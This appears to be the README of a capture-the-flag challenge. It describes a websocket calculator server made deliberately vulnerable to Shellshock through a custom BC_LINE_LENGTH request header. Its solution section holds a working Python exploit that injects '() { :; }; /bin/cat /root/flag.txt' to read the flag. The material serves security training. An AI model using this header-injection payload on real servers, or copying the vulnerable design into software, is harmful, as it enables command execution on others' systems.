# Calculataser

```text
We've spun up an old websocket arbitrary precision calculator from 2014 just bc we can, obviously.

We made a client for you. Give it a whirl!
```

## Setup

1. `docker build -t calculataser .`
2. `docker run --rm -p 3012:3012 -d calculataser`

**We MUST change the client to use the target server address/domain before release**

## Brief Dev Description

A websocket server which invokes bc in a manner which is vulnerable to shellshock (CVE-2014-6271). Users are permitted
to add their own line length environmental variable, which can be used to invoke commands via shellshock.

## Solution

It's websocket shell time.

```python
import websocket

if __name__ == '__main__':
    ws = websocket.WebSocket()
    ws.connect("ws://172.17.0.2:3012/", header=["BC_LINE_LENGTH: () { :; }; /bin/cat /root/flag.txt"])

    ws.send("1 + 5\n")

    result = ws.recv()
    print("Received '%s'" % str(result.decode("utf-8")))
    ws.close()
```

Note that the injection occurs within the BC_LINE_LENGTH request header. This is not triggerable from a browser, I
promise.

## Possible Difficulty Enhancements

 - It would be possible to configure a response for `OPTIONS` that specifies that the header may be provided, but don't
tell the user. This might be considered... unfair.
